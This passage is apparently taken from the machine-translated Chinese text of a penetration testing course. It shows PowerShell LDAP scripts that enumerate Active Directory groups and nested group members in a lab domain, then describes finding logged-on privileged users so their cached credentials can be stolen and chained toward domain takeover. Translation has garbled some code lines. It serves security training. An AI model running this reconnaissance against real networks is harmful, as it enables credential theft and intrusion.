<div style="position:absolute;top:17802;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$objDomain = 新对象 System.DirectoryServices.DirectoryEntry</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:17867;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">624 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2018 年），https://docs.microsoft.com/en-us/windows/win32/ad/object-class-and-object-category</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:17995;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="16"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 16 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:18028;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:19105;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:19105;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:19105;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">633</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:18140;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$Searcher.SearchRoot = $objDomain</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:18174;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$Searcher.filter="(objectClass=Group)"</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:18208;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$Result = $Searcher.FindAll()</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:18242;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Foreach($结果中的$obj)</font></font></b></nobr></div>
<div style="position:absolute;top:18259;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{</font></font></b></nobr></div>
<div style="position:absolute;top:18276;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$obj.Properties.name</font></font></b></nobr></div>
<div style="position:absolute;top:18293;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">}</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:18313;left:252"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 675 - 修改 PowerShell 脚本以枚举所有域组</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:18342;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行时，脚本会输出域中所有组的列表。</font><font style="vertical-align: inherit;">截断的输出显示在</font></font></nobr></div>
<div style="position:absolute;top:18361;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 676 显示了组 Secret_Group、Nested_Group 和 Another_Nested_Group：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:18396;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:18413;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主要管理员</font></font></nobr></div>
<div style="position:absolute;top:18430;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">企业密钥管理员</font></font></nobr></div>
<div style="position:absolute;top:18447;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Dns 管理员</font></font></nobr></div>
<div style="position:absolute;top:18464;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Dns更新代理</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:18481;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Secret_Group</font></font></b></nobr></div>
<div style="position:absolute;top:18498;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nested_Group</font></font></b></nobr></div>
<div style="position:absolute;top:18515;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">另一个_嵌套_组</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:18534;left:274"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 676 - 枚举域组的截断输出</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:18564;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">现在让我们尝试通过在</font><i><font style="vertical-align: inherit;">名称</font></i><font style="vertical-align: inherit;">上设置适当的过滤器来列出 Secret_Group 的成员</font></font><i><font style="vertical-align: inherit;"></font></i></nobr></div>
<div style="position:absolute;top:18583;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">财产。</font></font></nobr></div>
<div style="position:absolute;top:18616;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">另外，我们将只显示</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">成员</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">属性来获取组成员。</font><font style="vertical-align: inherit;">修改后的</font></font></nobr></div>
<div style="position:absolute;top:18635;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 677 中显示了实现此目的的 PowerShell，其中突出显示了更改：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:18670;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()</font></font></nobr></div>
<div style="position:absolute;top:18704;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$PDC = ($domainObj.PdcRoleOwner).Name</font></font></nobr></div>
<div style="position:absolute;top:18738;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$SearchString = "LDAP://"</font></font></nobr></div>
<div style="position:absolute;top:18772;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$SearchString += $PDC + "/"</font></font></nobr></div>
<div style="position:absolute;top:18806;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"</font></font></nobr></div>
<div style="position:absolute;top:18840;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$SearchString += $DistinguishedName</font></font></nobr></div>
<div style="position:absolute;top:18874;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$Searcher = 新对象 System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)</font></font></nobr></div>
<div style="position:absolute;top:18908;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$objDomain = 新对象 System.DirectoryServices.DirectoryEntry</font></font></nobr></div>
<div style="position:absolute;top:18942;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$Searcher.SearchRoot = $objDomain</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:18976;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$Searcher.filter="(name=Secret_Group)"</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:19009;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$Result = $Searcher.FindAll()</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:19043;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Foreach($结果中的$obj)</font></font></b></nobr></div>
</span></font>

<div style="position:absolute;top:19183;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="17"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 17 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:19216;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:20293;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:20293;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:20293;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">634</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:19312;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">{</font></font></b></nobr></div>
<div style="position:absolute;top:19328;left:141"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$obj.Properties.member</font></font></b></nobr></div>
<div style="position:absolute;top:19345;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">}</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:19365;left:284"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 677 - 用于枚举组成员的 PowerShell 脚本</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:19395;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">修改后的脚本将转储 DistinguishedName 组成员的名称：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:19429;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CN= </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nested_Group</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ,OU=CorpGroups,DC=corp,DC=com</font></font></nobr></div>
<div style="position:absolute;top:19448;left:318"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 678 - Secret_Group 组的成员</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:19478;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据此输出，Nested_Group 是 Secret_Group 的成员。</font><font style="vertical-align: inherit;">为了列举其</font></font></nobr></div>
<div style="position:absolute;top:19497;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">成员，我们必须重复执行的步骤以列出 Nested_Group 的成员。</font><font style="vertical-align: inherit;">我们</font></font></nobr></div>
<div style="position:absolute;top:19517;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以通过替换过滤条件中的组名来做到这一点：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:19551;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:19568;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$Searcher.SearchRoot = $objDomain</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:19602;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$Searcher.filter="(name=Nested_Group)"</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:19619;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:19638;left:305"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 679 - 获取 Nested_Group 的成员</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:19668;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此更新后的脚本生成清单 680 中所示的输出：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:19703;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CN= </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Another_Nested_Group</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ,OU=CorpGroups,DC=corp,DC=com</font></font></nobr></div>
<div style="position:absolute;top:19722;left:316"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 680 - Nested_Group 组的成员</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:19752;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这表明Another_Nested_Group 是Nested_Group 的唯一成员。</font><font style="vertical-align: inherit;">我们需要</font></font></nobr></div>
<div style="position:absolute;top:19771;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">修改并再次运行脚本，替换过滤条件中的组名。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:19806;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:19823;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$Searcher.SearchRoot = $objDomain</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:19857;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">$Searcher.filter="(name=Another_Nested_Group)"</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:19874;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:19893;left:279"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 681 - 获取 Another_Nested_Group 的成员</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:19923;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">下一次搜索的输出显示在清单 682 中。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:19958;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CN=Adam,OU=Normal,OU=CorpUsers,DC=corp,DC=com</font></font></nobr></div>
<div style="position:absolute;top:19977;left:290"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 682 - 组 Another_Nested_Group 的成员</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:20006;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最后我们发现域用户 Adam 是 Another_Nested_Group 的唯一成员。</font><font style="vertical-align: inherit;">这</font></font></nobr></div>
<div style="position:absolute;top:20025;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">结束解开嵌套组所需的枚举并演示 PowerShell 如何</font></font></nobr></div>
<div style="position:absolute;top:20045;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以利用 LDAP 来执行这种查找。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:20079;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.2.3.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:20109;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1.重复枚举，揭开Secret_Group、Nested_Group、</font></font></nobr></div>
<div style="position:absolute;top:20129;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和另一个_嵌套_组。</font></font></nobr></div>
<div style="position:absolute;top:20157;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 本节中介绍的脚本要求我们在每次迭代时更改组名。</font></font></nobr></div>
<div style="position:absolute;top:20176;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">调整脚本以便在不知道嵌套组的情况下以编程方式解开嵌套组</font></font></nobr></div>
<div style="position:absolute;top:20196;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">预先命名。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:20371;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="18"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 18 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:20404;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:21481;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:21481;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:21481;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">635</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:20500;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">21.2.4</font></font></i></nobr></div>
<div style="position:absolute;top:20500;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当前登录的用户</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:20538;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此时，我们可以列出用户及其组成员身份，并且可以轻松找到</font></font></nobr></div>
<div style="position:absolute;top:20557;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">管理用户。</font></font></nobr></div>
<div style="position:absolute;top:20590;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">下一步，我们要查找属于高价值组成员的登录用户，因为他们</font></font></nobr></div>
<div style="position:absolute;top:20609;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">凭据将被缓存在内存中，我们可以窃取凭据并进行身份验证</font></font></nobr></div>
<div style="position:absolute;top:20629;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">他们。</font></font></nobr></div>
<div style="position:absolute;top:20661;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果我们成功攻破其中一位</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域管理员</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，我们最终可以接管整个</font></font></nobr></div>
<div style="position:absolute;top:20681;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域（我们将在后面的部分中看到）。</font><font style="vertical-align: inherit;">或者，如果我们不能立即妥协一个</font></font></nobr></div>
<div style="position:absolute;top:20700;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域管理员</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，我们必须破坏其他帐户或机器才能最终获得</font></font></nobr></div>
<div style="position:absolute;top:20720;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">访问级别。</font></font></nobr></div>
<div style="position:absolute;top:20753;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，图 307 显示 Bob 已登录到 CLIENT512 并且是本地管理员</font></font></nobr></div>
<div style="position:absolute;top:20772;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">所有工作站。</font><font style="vertical-align: inherit;">Alice 登录到 CLIENT621 并且是所有服务器的本地管理员。</font><font style="vertical-align: inherit;">最后，</font></font></nobr></div>
<div style="position:absolute;top:20791;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Jeff 已登录到 SERVER21，并且是 Domain Admins 组的成员。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:21034;left:339"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 307：要妥协的用户链</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:21065;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果我们设法破坏 Bob 的帐户（例如通过客户端攻击），我们可以</font></font></nobr></div>
<div style="position:absolute;top:21084;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从 CLIENT512 转向 CLIENT621 上的 Alice。</font><font style="vertical-align: inherit;">推而广之，我们或许可以再次转向</font></font></nobr></div>
<div style="position:absolute;top:21104;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 SERVER21 上攻击 Jeff，获得域访问权限。</font></font></nobr></div>
<div style="position:absolute;top:21136;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这种情况下，我们必须调整我们的枚举，不仅要考虑</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域管理员，</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">还要</font><font style="vertical-align: inherit;">考虑</font></font></nobr></div>
<div style="position:absolute;top:21155;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">还有“连锁妥协”的潜在途径，包括寻找所谓的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">衍生本地</font></font></i></nobr></div>
<div style="position:absolute;top:21175;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">管理员</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">625</font></font></font></nobr></div>
<div style="position:absolute;top:21208;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为此，我们需要一个登录到目标的用户列表。</font><font style="vertical-align: inherit;">我们可以与目标交互</font></font></nobr></div>
<div style="position:absolute;top:21227;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">直接检测，或者我们可以在域控制器或文件上跟踪用户的活动登录会话</font></font></nobr></div>
<div style="position:absolute;top:21246;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器。</font></font></nobr></div>
<div style="position:absolute;top:21279;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以帮助我们实现这些目标的两个最可靠的 Windows 功能是</font></font></nobr></div>
<div style="position:absolute;top:21299;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NetWkstaUserEnum </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">626</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NetSessionEnum </font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">627</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> API。</font><font style="vertical-align: inherit;">而前者需要行政</font></font></nobr></div>
<div style="position:absolute;top:21318;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">权限并返回登录到目标工作站的所有用户的列表，后者可以使用</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:21391;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">625 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(@sixdub, 2016), http://www.sixdub.net/?p=591</font></font></font></nobr></div>
<div style="position:absolute;top:21411;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">626 </font><font style="font-size:9px"><font style="vertical-align: inherit;">（微软，2018 年），https:</font></font><font style="vertical-align: inherit;"> //msdn.microsoft.com/en-us/library/windows/desktop/aa370669 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(v=vs.85).aspx</font></font></font></nobr></div>
<div style="position:absolute;top:21431;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">627 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（微软，2018 年），https://docs.microsoft.com/en-us/windows/win32/api/lmshare/nf-lmshare-netsessionenum</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:21559;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="19"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 19 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:21592;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:22669;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:22669;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:22669;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">636</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:21688;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来自普通域用户并返回服务器（如文件服务器）上的活动用户会话列表</font></font></nobr></div>
<div style="position:absolute;top:21707;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或域控制器。</font></font></nobr></div>
<div style="position:absolute;top:21740;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在评估过程中，在破坏域机器后，我们应该枚举每个</font></font></nobr></div>
<div style="position:absolute;top:21759;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">域中的计算机，然后</font><font style="vertical-align: inherit;">对获得的目标列表</font><font style="vertical-align: inherit;">使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NetWkstaUserEnum</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">保持</font></font></nobr></div>
<div style="position:absolute;top:21779;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请记住，如果我们具有本地管理员权限，此 API 只会列出登录到目标的用户</font></font></nobr></div>
<div style="position:absolute;top:21798;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在那个目标上。</font></font></nobr></div>
<div style="position:absolute;top:21831;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或者，我们可以将精力集中在发现域控制器和任何潜在文件上</font></font></nobr></div>
<div style="position:absolute;top:21850;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">网络中的服务器（基于服务器主机名或开放端口）并使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">NetSessionEnum</font></font></i></nobr></div>
<div style="position:absolute;top:21870;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">针对这些服务器以枚举所有活动用户的会话。</font></font></nobr></div>
<div style="position:absolute;top:21902;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这个过程将为我们提供一个很好的“开发地图”，以便我们遵循</font></font></nobr></div>
